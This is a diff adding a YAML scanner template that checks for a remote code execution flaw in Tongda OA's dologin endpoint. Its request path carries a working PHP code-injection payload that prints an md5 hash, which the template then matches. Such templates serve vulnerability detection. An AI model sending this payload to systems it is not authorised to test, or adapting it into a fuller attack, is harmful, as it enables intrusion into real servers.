@@ -1,0 +1,34 @@
+id: poc-yaml-tongda-oa-dologin-rce
+info:
+  name: 通达OA dologin 远程代码执行漏洞
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: rce
+
+variables:
+  t1: "{{rand_int(1000, 10000)}}"
+  t2: "{{md5(t1)}}"
+
+http:
+  - method: GET
+    path:
+      - "/general/appbuilder/web/portal/gateway/dologin?name[]=%E9%8C%A6%27.print_r(md5({{t1}})),//"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - '\"status\":\"1\"'
+          - "{{t2}}"
+      - type: word
+        part: header
+        words:
+          - "application/json"
+      - type: word
+        part: body
+        words:
+          - "<"
+        negative: true
